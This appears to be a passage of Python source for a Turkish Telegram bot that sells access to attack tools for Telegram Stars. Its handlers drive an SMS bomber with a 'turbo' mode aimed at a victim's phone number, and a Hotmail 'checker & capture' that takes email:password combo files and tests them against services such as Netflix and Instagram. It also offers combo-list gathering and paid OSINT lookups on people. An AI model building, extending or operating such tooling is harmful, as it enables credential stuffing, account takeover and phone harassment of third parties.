            f"📊 <b>İSTATİSTİKLER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Kullanıcı: {tu}\n📧 Hotmail Premium: {prem_pu or 0}\n"
            f"🌍 OSINT Premium: {osint_pu or 0}\n📦 Combo: {tc or 0}\n🔍 Sorgu: {tch or 0}",
            parse_mode="HTML")

    @bot_instance.message_handler(commands=["tgid", "telegramid", "tgsorgu"])
    def cmd_tgid(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        balance = tgid_get_balance(uid)
        if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
        elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
        else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT} | 💰 {balance}"
        bot_instance.reply_to(msg,
            f"🆔 <b>TELEGRAM ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
            f"🔍 Kullanıcı adını sorgula.",
            reply_markup=tgid_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["aiimg", "ai", "resim"])
    def cmd_aiimg(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
        credits = aiimg_get_credits(uid)
        if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
        elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
        else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT} | 💎 {credits}"
        bot_instance.reply_to(msg,
            f"🎨 <b>AI IMAGE GENERATOR</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
            f"📸 Fotoğraf gönder → AI dönüştürsün!",
            reply_markup=aiimg_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["exif", "foto", "meta"])
    def cmd_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        bot_instance.reply_to(msg,
            "📸 <b>EXIF Metadata Okuyucu</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Analiz etmek istediğin fotoğrafı gönder.", parse_mode="HTML")

    @bot_instance.message_handler(commands=["sarki", "muzik", "music", "song"])
    def cmd_music(msg):
        _process_music(msg, bot_instance)

    @bot_instance.message_handler(commands=["addbot"])
    def cmd_addbot(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        parts = msg.text.split()
        if len(parts) < 2:
            bot_instance.reply_to(msg, s(uid, "multi_bot_add_usage"), parse_mode="HTML"); return
        token = parts[1].strip()
        if len(token) < 30 or token == BOT_TOKEN:
            bot_instance.reply_to(msg, "❌ Geçersiz token!", parse_mode="HTML"); return
        with _PROC_LOCK:
            if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
                bot_instance.reply_to(msg, s(uid, "multi_bot_exists"), parse_mode="HTML"); return
            try:
                success = _spawn_bot(token, uid)
                if success:
                    bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=esc(token[:20] + "...")), parse_mode="HTML")
                else:
                    bot_instance.reply_to(msg, "❌ Başlatılamadı!", parse_mode="HTML")
            except Exception as e:
                bot_instance.reply_to(msg, f"❌ {esc(e)}", parse_mode="HTML")

    @bot_instance.message_handler(commands=["video"])
    def cmd_video(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        m = bot_instance.reply_to(msg, s(uid, "video_ask"), parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))

    @bot_instance.message_handler(commands=["smsbomb", "sms"])
    def cmd_smsbomb(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                sess = _SMS_SESSIONS[uid]
                bot_instance.reply_to(msg,
                    f"⚠️ <b>Aktif Bombardıman!</b>\n📱 <code>{esc(sess['target'])}</code>\n📊 {sess['count']}",
                    parse_mode="HTML")
                return
        m = bot_instance.reply_to(msg,
            "💣 <b>SMS Bomber</b>\n📱 Hedef numara (10 haneli):\nÖrnek: <code>5306524123</code>", parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))

    @bot_instance.message_handler(commands=["smsstop"])
    def cmd_smsstop(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS or not _SMS_SESSIONS[uid].get("running"):
                bot_instance.reply_to(msg, "❌ Aktif bombardıman yok.", parse_mode="HTML"); return
            sess = _SMS_SESSIONS[uid]
            sess["event"].set(); sess["running"] = False
            bot_instance.reply_to(msg,
                f"🛑 <b>Durduruldu</b>\n📱 <code>{esc(sess['target'])}</code>\n📊 {sess['count']} SMS",
                parse_mode="HTML")

    @bot_instance.message_handler(commands=["smsstatus"])
    def cmd_smsstatus(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS:
                bot_instance.reply_to(msg, "📊 Yok.", parse_mode="HTML"); return
            sess = dict(_SMS_SESSIONS[uid])
            status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
            bot_instance.reply_to(msg,
                f"📊 <b>Durum</b>\n📱 <code>{esc(sess['target'])}</code>\n📌 {status}\n📊 {sess['count']} SMS",
                parse_mode="HTML")

    @bot_instance.message_handler(commands=["admin"])
    def cmd_admin(msg):
        uid = msg.from_user.id
        if uid != ADMIN_ID:
            bot_instance.reply_to(msg, s(uid, "admin_only"), parse_mode="HTML"); return
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(
            _btn("📊 Bot İstatistik", "adm_stats"),
            _btn("⭐ Premium Kullanıcılar", "adm_prem_users"),
            _btn("📋 Premium Log", "adm_prem_log"),
            _btn("⭐ Premium Ver", "adm_give_premium"),
            _btn("➖ Premium Kaldır", "adm_remove"),
            _btn("🚫 Banla", "adm_ban"),
            _btn("✅ Ban Kaldır", "adm_unban"),
            _btn("📋 Yasaklılar", "adm_banned"),
            _btn("📢 Duyuru", "adm_announce"),
            _btn("🤖 Botlar", "adm_listbots"),
            _btn("📋 Hotmail Log", "adm_hotmail_log"),
            _btn("🆔 TG-ID Bakiye Ver", "adm_tgid_give"),
            _btn("➖ TG-ID Bakiye Al", "adm_tgid_take"),
            _btn("📋 TG-ID Logları", "adm_tgid_logs"),
            _btn("💰 TG-ID Satın Almalar", "adm_tgid_purchases"),
            _btn("🎨 AI Hak Ver", "adm_aiimg_give"),
            _btn("➖ AI Hak Al", "adm_aiimg_take"),
            _btn("📋 AI Logları", "adm_aiimg_logs"),
            _btn("💰 AI Satın Almalar", "adm_aiimg_purchases"),
        )
        bot_instance.reply_to(msg, "👑 <b>ADMIN PANELİ</b>", reply_markup=mk, parse_mode="HTML")

    @bot_instance.message_handler(content_types=["photo", "document"])
    def handle_photo_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        caption = (msg.caption or "").strip().lower()
        aiimg_trigger = any(caption == t or caption.startswith(t + " ") for t in ("/aiimg","aiimg","/ai","/generate","/uret"))
        if aiimg_trigger:
            aiimg_process(msg, bot_instance); return
        exif_trigger = any(caption == t or caption.startswith(t + " ") for t in ("/exif","/meta","/foto","exif","meta"))
        if msg.content_type == "document":
            doc = msg.document
            if doc.mime_type not in ("image/jpeg","image/jpg","image/png","image/tiff","image/webp","image/heic"):
                if exif_trigger:
                    bot_instance.reply_to(msg, "❌ Resim değil!", parse_mode="HTML")
                return
            if caption != "" and not exif_trigger: return
        wait_msg = bot_instance.reply_to(msg, "🔍 Analiz ediliyor...", parse_mode="HTML")
        gecici = f"/tmp/exif_{uid}_{int(time.time())}.jpg"
        try:
            if msg.content_type == "photo":
                fi = bot_instance.get_file(msg.photo[-1].file_id)
                dosya = bot_instance.download_file(fi.file_path)
            else:
                fi = bot_instance.get_file(msg.document.file_id)
                dosya = bot_instance.download_file(fi.file_path)
            with open(gecici, "wb") as f: f.write(dosya)
            sonuc, hata = _exif_analiz(gecici)
            if hata:
                bot_instance.edit_message_text(hata, wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML"); return
            mesaj = _exif_mesaj_olustur(sonuc)
            bot_instance.edit_message_text(mesaj, wait_msg.chat.id, wait_msg.message_id,
                                           parse_mode="HTML", disable_web_page_preview=False)
        except Exception as e:
            try:
                bot_instance.edit_message_text(f"❌ Hata: <code>{esc(e)}</code>",
                                               wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML")
            except: pass
        finally:
            try: os.remove(gecici)
            except: pass

    MENU_KEYS = {
        "tr": {"combo": "📦 Combo Çek", "tools": "🛠 Araçlar", "stats": "📊 İstatistik",
               "profile": "👤 Profil", "lb": "🏆 Lider Tablosu", "api": "⚙️ API Değiştir", "help": "❓ Yardım"},
        "en": {"combo": "📦 Combo", "tools": "🛠 Tools", "stats": "📊 Stats",
               "profile": "👤 Profile", "lb": "🏆 Leaderboard", "api": "⚙️ API", "help": "❓ Help"},
        "ar": {"combo": "📦 كومبو", "tools": "🛠 الأدوات", "stats": "📊 الإحصائيات",
               "profile": "👤 الملف", "lb": "🏆 المتصدرون", "api": "⚙️ API", "help": "❓ مساعدة"},
    }

    @bot_instance.message_handler(func=lambda m: True, content_types=["text"])
    def handle_text(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        txt = msg.text; l = lang(uid); keys = MENU_KEYS.get(l, MENU_KEYS["tr"])
        if txt == keys.get("combo"):
            m = bot_instance.reply_to(msg, s(uid, "combo_ask"), parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _process_combo(m, bot_instance))
        elif txt == keys.get("tools"):
            bot_instance.reply_to(msg, s(uid, "select_op"), reply_markup=tools_kb(uid), parse_mode="HTML")
        elif txt == keys.get("stats"): _show_stats(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("profile"): _show_profile(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("lb"): _show_leaderboard(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("api"): _show_api_menu(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("help"): _show_help(msg.chat.id, uid, bot_instance)

    @bot_instance.callback_query_handler(func=lambda c: True)
    def handle_cb(call):
        try:
            uid = call.from_user.id
            data = call.data
            if data.startswith("lang_"):
                l = data[5:]; db_set(uid, "language", l)
                name = esc(call.from_user.first_name or "User")
                status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
                try: bot_instance.answer_callback_query(call.id, s(uid, "lang_ok"))
                except: pass
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    s(uid, "welcome", name=name, status=status), reply_markup=main_kb(uid), parse_mode="HTML")
                return
            if data == "noop":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_home":
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id, "🏠", reply_markup=main_kb(uid))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_tools":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(s(uid, "select_op"), call.message.chat.id, call.message.message_id,
                                                   reply_markup=tools_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, s(uid, "select_op"),
                                              reply_markup=tools_kb(uid), parse_mode="HTML")
                return
            if data == "menu_turkey":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=turkey_kb(uid))
                except:
                    bot_instance.send_message(call.message.chat.id, "🇹🇷", reply_markup=turkey_kb(uid), parse_mode="HTML")
                return
            if data == "menu_ls":
                if not is_premium_osint(uid):
                    mk = InlineKeyboardMarkup()
                    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
                    mk.add(_btn(s(uid, "back_btn"), "goto_tools"))
                    txt = "🔒 <b>LeakSights OSINT — Premium</b>\n💰 200 Yıldız\n🔍 30+ OSINT"
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=mk, parse_mode="HTML")
                    except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=mk, parse_mode="HTML")
                else:
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try: bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=ls_kb(uid))
                    except: bot_instance.send_message(call.message.chat.id, "🌍", reply_markup=ls_kb(uid), parse_mode="HTML")
                return
            if data == "buy_premium":
                if is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "⭐ Zaten Premium!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="⭐ Premium", amount=PREMIUM_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="Premium",
                    description="Sınırsız Hotmail + Capture + Keyword + TG-ID + AI",
                    invoice_payload="premium", provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "buy_osint":
                if is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 Zaten OSINT Premium!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="🌍 OSINT", amount=OSINT_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="OSINT Premium",
                    description="LeakSights 30+ Sorgu", invoice_payload="osint",
                    provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            # 🆔 TG-ID
            if data == "tool_tgid":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
                balance = tgid_get_balance(uid)
                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
                else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT} | 💰 {balance}"
                txt = f"🆔 <b>TELEGRAM ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n🔍 Kullanıcı adını sorgula."
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=tgid_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")
                return
            if data == "tgid_search":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    "🔍 <b>Telegram ID Sorgu</b>\nSorgulamak istediğin kullanıcı adını yaz:\nÖrnek: <code>@durov</code>",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: tgid_process_search(m, bot_instance))
                return
            if data == "tgid_packages":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                txt = (f"💎 <b>PAKETLER</b>\n"
                       f"• {TGID_PACKAGE_25} → {TGID_PRICE_25} ⭐\n"
                       f"• {TGID_PACKAGE_50} → {TGID_PRICE_50} ⭐\n"
                       f"• {TGID_PACKAGE_100} → {TGID_PRICE_100} ⭐")
                try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=tgid_packages_kb(), parse_mode="HTML")
                except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_packages_kb(), parse_mode="HTML")
                return
            if data == "tgid_my_stats":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                tgid_show_my_stats(call.message.chat.id, uid, bot_instance)
                return
            if data.startswith("tgid_buy_"):
                pn = data.replace("tgid_buy_", "")
                pm = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),"50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),"100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
                if pn not in pm:
                    try: bot_instance.answer_callback_query(call.id, "❌", show_alert=True)
                    except: pass
                    return
                qty, stars, label = pm[pn]
                prices = [LabeledPrice(label=label, amount=stars)]
                try:
                    bot_instance.send_invoice(chat_id=call.message.chat.id, title=f"💎 {label}",
                        description=f"{qty} TG-ID sorgu hakkı", invoice_payload=f"tgid_{pn}",
                        provider_token="", currency="XTR", prices=prices)
                    bot_instance.answer_callback_query(call.id, "✅ Fatura!")
                except Exception as e:
                    bot_instance.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
                return
            # 🎨 AI IMAGE
            if data == "tool_aiimg":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
                credits = aiimg_get_credits(uid)
                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
                else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT} | 💎 {credits}"
                txt = (f"🎨 <b>AI IMAGE GENERATOR</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
                       f"📸 Fotoğraf gönder → AI dönüştürsün!\n\n"
                       f"<b>Örnekler:</b>\n• <i>Lift your heart</i>\n• <i>Cyberpunk</i>\n• <i>Anime style</i>")
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=aiimg_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=aiimg_kb(uid), parse_mode="HTML")
                return
            if data == "aiimg_generate":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    "📸 <b>AI Resim İçin Fotoğraf Gönder</b>\nBir fotoğraf gönder, ardından promptunu yaz.",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: aiimg_process(m, bot_instance))
                return
            if data == "aiimg_packages":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                txt = (f"💎 <b>AI PAKETLERİ</b>\n"
                       f"• {AI_IMG_PACK_25} → {AI_IMG_PRICE_25} ⭐\n"
                       f"• {AI_IMG_PACK_50} → {AI_IMG_PRICE_50} ⭐\n"
                       f"• {AI_IMG_PACK_250} → {AI_IMG_PRICE_250} ⭐")
                try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=aiimg_packages_kb(), parse_mode="HTML")
                except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=aiimg_packages_kb(), parse_mode="HTML")
                return
            if data == "aiimg_my_stats":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                aiimg_show_stats(call.message.chat.id, uid, bot_instance)
                return
            if data.startswith("aiimg_buy_"):
                pn = data.replace("aiimg_buy_", "")
                pm = {"25":(AI_IMG_PACK_25,AI_IMG_PRICE_25,"25 Hak"),"50":(AI_IMG_PACK_50,AI_IMG_PRICE_50,"50 Hak"),"250":(AI_IMG_PACK_250,AI_IMG_PRICE_250,"250 Hak")}
                if pn not in pm:
                    try: bot_instance.answer_callback_query(call.id, "❌", show_alert=True)
                    except: pass
                    return
                qty, stars, label = pm[pn]
                prices = [LabeledPrice(label=label, amount=stars)]
                try:
                    bot_instance.send_invoice(chat_id=call.message.chat.id, title=f"🎨 {label}",
                        description=f"{qty} AI hak", invoice_payload=f"aiimg_{pn}",
                        provider_token="", currency="XTR", prices=prices)
                    bot_instance.answer_callback_query(call.id, "✅ Fatura!")
                except Exception as e:
                    bot_instance.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
                return
            if data == "tool_exif":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "📸 <b>EXIF Metadata</b>\nBir fotoğraf gönder.", parse_mode="HTML")
                return
            if data == "tool_music":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "🎵 <b>Müzik İndirici</b>\nKullanım: <code>/sarki Sanatçı Şarkı</code>", parse_mode="HTML")
                return
            if data.startswith("sms_"):
                parts = data.split("_")
                mode = parts[1]; phone = parts[2]; mail = parts[3] if len(parts) > 3 else ""
                if mode == "normal":
                    m = bot_instance.send_message(call.message.chat.id,
                        f"⚡ <b>Normal Mod</b>\n📱 <code>{esc(phone)}</code>\n🔢 Limit ve aralık gir:\nÖrnek: <code>50 2</code>",
                        parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _sms_normal_settings(m, phone, mail, bot_instance))
                else:
                    _launch_sms_bomb(uid, phone, mail, "turbo", None, 0, bot_instance)
                    try: bot_instance.answer_callback_query(call.id, "🚀 Turbo!")
                    except: pass
                return
            if data == "tool_addbot":
                prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get("addbot")
                m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_addbot(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_php2py":
                bot_instance.send_message(call.message.chat.id, s(uid, "php2py"), parse_mode="HTML")
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_smsbomb":
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                        try: bot_instance.answer_callback_query(call.id, "⚠️ Aktif!", show_alert=True)
                        except: pass
                        return
                m = bot_instance.send_message(call.message.chat.id,
                    "💣 <b>SMS Bomber</b>\n📱 Hedef (10 haneli):\nÖrnek: <code>5306524123</code>",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_hotmail":
                user_name = esc(get_user_name(uid))
                keywords = get_user_keywords(uid)
                limit_text = get_keyword_limit_text(uid)
                is_prem = is_premium(uid)
                capture_left = get_capture_limit_text(uid)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 {user_name}\n"
                        f"🔖 {esc(', '.join(keywords))}\n"
                        f"📧 Hotmail: {'⭐ Premium' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT})'}\n"
                        f"📸 Capture: {'⭐ Premium' if is_prem else f'🆓 Free ({capture_left})'}",
                        call.message.chat.id, call.message.message_id,
                        reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id,
                        "📧 <b>HOTMAIL CHECKER & CAPTURE</b>",
                        reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                return
            if data == "hotmail_start":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                is_prem = is_premium(uid)
                limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
                m = bot_instance.send_message(call.message.chat.id,
                    f"📧 <b>Hotmail Checker</b>\n📌 Limit: {limit}\nCombo dosyası (email:password) gönderin.",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_hotmail_file(m, bot_instance))
                return
            if data == "hotmail_addkw":
                if not can_add_keyword(uid):
                    try: bot_instance.answer_callback_query(call.id, "❌ Limit dolu!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"➕ <b>Keyword Ekle</b>\nMevcut: {esc(', '.join(get_user_keywords(uid)))}", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_add_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_delkw":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"🗑️ <b>Keyword Sil</b>\nMevcut: {esc(', '.join(get_user_keywords(uid)))}", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_del_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_resetkw":
                set_user_keywords(uid, ["tiktok","instagram","netflix"])
                try: bot_instance.answer_callback_query(call.id, "✅ Sıfırlandı!", show_alert=True)
                except: pass
                return
            if data == "capture_menu":
                if not can_use_capture(uid):
                    try: bot_instance.answer_callback_query(call.id, "❌ Hak doldu!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📸 <b>CAPTURE TOOL</b>\n👤 {esc(get_user_name(uid))}\n📌 Platform seçin:",
                        call.message.chat.id, call.message.message_id,
                        reply_markup=capture_keyboard(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, "📸 <b>CAPTURE TOOL</b>",
                                              reply_markup=capture_keyboard(uid), parse_mode="HTML")
                return
            if data == "goto_hotmail":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text("📧 <b>HOTMAIL</b>",
                                                   call.message.chat.id, call.message.message_id,
                                                   reply_markup=hotmail_keyboard(uid), parse_mode="HTML")
                except: pass
                return
            if data == "capture_all":
                if not is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "🔒 Premium!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id, "📸 Tüm platformlar. Combo gönderin.", parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, None))
                return
            if data.startswith("capture_"):
                try:
                    num = int(data.split("_")[1])
                    if num in CAPTURE_APPS:
                        ta = CAPTURE_APPS[num]; pn = CAPTURE_NAMES[num]
                        try: bot_instance.answer_callback_query(call.id)
                        except: pass
                        m = bot_instance.send_message(call.message.chat.id,
                            f"📸 <b>{pn}</b> seçildi. Combo gönderin.", parse_mode="HTML")
                        bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, ta))
                except: pass
                return
            if data.startswith("tool_"):
                key = data[5:]
                if key == "video":
                    m = bot_instance.send_message(call.message.chat.id, s(uid, "video_ask"), parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))
                elif key == "predunyam":
                    _run_predunyam(call.message.chat.id, uid, bot_instance)
                elif key == "php2py":
                    bot_instance.send_message(call.message.chat.id, s(uid, "php2py"), parse_mode="HTML")
                elif key in ("proxycheck", "urlscan"):
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_special_tool(m, key, bot_instance))
                elif key in TOOLS_API:
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt, parse_mode="HTML")
                    bot_instance.register_next_step_handler(m, lambda m: _process_generic_tool(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("tr_"):
                key = data[3:]
                prompt = TURKEY_PROMPTS.get(lang(uid), TURKEY_PROMPTS["tr"]).get(key, s(uid, "enter_val"))
                m = bot_instance.send_message(call.message.chat.id, s(uid, "tr_ask", prompt=prompt), parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_turkey(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("ls_"):
                if not is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 OSINT Premium!", show_alert=True)
                    except: pass
                    return
                key = data[3:]
                info = LEAKSIGHTS_API.get(key, {})
                m = bot_instance.send_message(call.message.chat.id,
                    s(uid, "ls_ask", icon=info.get("icon", "🔍"),
                      tool=esc(info.get(lang(uid), info.get("tr", key)))), parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: _process_ls(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("adm_"):
                if uid != ADMIN_ID:
                    try: bot_instance.answer_callback_query(call.id, s(uid, "admin_only"), show_alert=True)
                    except: pass
                    return
                _handle_admin_cb(call, data[4:], bot_instance)
                return
            if data.startswith("setapi_"):
                val = data[7:]
                if val == "default":
                    db_set(uid, "api_pref", 0)
                    try: bot_instance.answer_callback_query(call.id, "✅ Varsayılan")
                    except: pass
                else:
                    idx = int(val); db_set(uid, "api_pref", idx)
                    try: bot_instance.answer_callback_query(call.id, f"✅ {API_LIST[idx]['name']}")
                    except: pass
                _show_api_menu(call.message.chat.id, uid, bot_instance,
                               edit=(call.message.chat.id, call.message.message_id))
                return
        except Exception as e:
            print(f"[CALLBACK ERROR] {e}")
            try: bot_instance.answer_callback_query(call.id, "⚠️ Hata!", show_alert=True)
            except: pass

    @bot_instance.pre_checkout_query_handler(func=lambda q: True)
    def precheckout(q):
        bot_instance.answer_pre_checkout_query(q.id, ok=True)

